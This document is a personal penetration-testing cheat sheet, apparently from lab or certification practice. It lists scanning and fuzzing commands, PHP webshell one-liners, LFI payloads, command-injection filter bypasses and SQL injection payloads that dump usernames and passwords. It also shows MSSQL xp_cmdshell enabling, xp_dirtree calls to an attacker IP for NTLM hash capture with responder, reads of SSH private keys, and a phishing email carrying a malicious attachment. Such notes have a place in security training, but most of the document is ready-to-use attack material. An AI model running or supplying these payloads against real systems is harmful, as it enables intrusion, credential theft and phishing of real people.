# My Cheet Sheet
- [My Cheet Sheet](#my-cheet-sheet)
- [Port Scan](#port-scan)
  - [rustscan](#rustscan)
  - [nmap](#nmap)
  - [Powershell](#powershell)
- [Recon](#recon)
  - [Autorecon](#autorecon)
  - [SNMP](#snmp)
  - [Web](#web)
    - [App](#app)
    - [subdomain](#subdomain)
    - [dir](#dir)
    - [endpoint](#endpoint)
- [Initial Access](#initial-access)
  - [Path Traversal](#path-traversal)
    - [LFI](#lfi)
  - [Webshell](#webshell)
  - [Reverse Shell](#reverse-shell)
    - [Bypass](#bypass)
  - [SQLi](#sqli)
    - [MSSQL](#mssql)
  - [ExploitDB](#exploitdb)
- [Phishing](#phishing)
  - [Tips](#tips)


# Port Scan
## rustscan
```bash
rustscan -a <IP> --top --ulimit 5000
```
## nmap
```bash
# IP-Sweep
nmap -sn -v 192.168.50.1-253 -oG ping-sweep.txt

# TCP
nmap -sT -n -Pn -v 192.168.50.1-254 -A
nmap -sT -n -Pn -v 192.168.50.1-254 --top-ports 1000 -A
# UDP
nmap -sU -n -Pn -v <IP>

# SMB
# help /usr/share/nmap/scripts
nmap -p 139,445 -n -Pn --script smb-protocols,smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-services 10.10.11.158
nmap -p 139,445 -n -Pn --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec 10.10.10.40

# SMTP
nmap -p 25 --script smtp-commands,smtp-ntlm-info

# vuln
nmap -n -Pn --script vuln 10.10.10.248
```
## Powershell
```powershell
# on powershell
1..8000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.221.151", $_)) "TCP port $_ is open"} 2>$null
```

# Recon
## Autorecon
```bash
```

## SNMP
```bash
# https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py
python3 snmpbrute.py -t 10.10.11.193

# snmpwalk
snmpwalk -c internal -v2c 10.10.11.193 
```

## Web
### App
```bash
# nikto
nikto -p 80 -h http://

# whatweb
whatweb -v http://
```
### subdomain
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http:// -H "Host: FUZZ. " -mc all -fs 111
```
### dir
```bash
# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -e aspx,txt,pdf,html,php -u http:// 
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -e aspx,txt,pdf,html,php -u http://

# dirsearch
dirsearch -u https://

# gobuster
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -k -x aspx,txt,pdf,html,php -u http://
gobuster dir -w /usr/share/wordlists/dirb/common.txt -k -x aspx,txt,pdf,html,php -u http://

# Dirb
dirb http://
```
### endpoint
```bash
# katana
katana -u http://
```

# Initial Access
https://github.com/swisskyrepo/PayloadsAllTheThings
## Path Traversal
```bash
/etc/passwd
/home/offsec/.ssh/id_rsa
/etc/nginx/nginx.conf
/etc/nginx/modules-enabled/default.conf
```
### LFI
```php
# page=...

php://filter/resource=admin.php
php://filter/convert.base64-encode/resource=admin.php

data://text/plain;base64,<base64>&cmd=ls
```
## Webshell
/usr/share/webshells
```php
<?php echo(system($_GET["cmd"])); ?>
<?php echo(shell_exec($_GET["cmd"])); ?>
<?php echo(exec($_GET["cmd"]));?>
```
## Reverse Shell
https://www.revshells.com/
https://tex2e.github.io/reverse-shell-generator/index.html
### Bypass
```bash
w'h'o'am'i
w"h"o"am"i
```
#### Linux
```bash
# /
${PATH:0:1}
${PWD:0:1}
# white
${IFS}
$9
# ;
${LS_COLORS:10:1}
```
#### Windows
```powershell
# \
$env:HOMEPATH[0]

```
## SQLi
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```bash
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //

# colum
' ORDER BY 1-- //
' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```
### MSSQL
https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

# help
help

# xp_cmdshell
enable_xp_cmdshell

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# NTLM
responder -I tun0

xp_dirtree '\\10.10.14.23\any\thing'

SELECT name FROM master.dbo.sysdatabases;
USE master
exec master.dbo.xp_dirtree '\\10.10.14.23\relay'
EXEC master..xp_subdirs '\\10.10.14.23\anything\'
EXEC master..xp_fileexist '\\10.10.14.23\anything\'
```

## ExploitDB
```bash
searchsploit -m 42031
```

# Phishing
```bash
# webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/work/webdav
# sendmail
swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.232.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap  
```

## Tips
```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```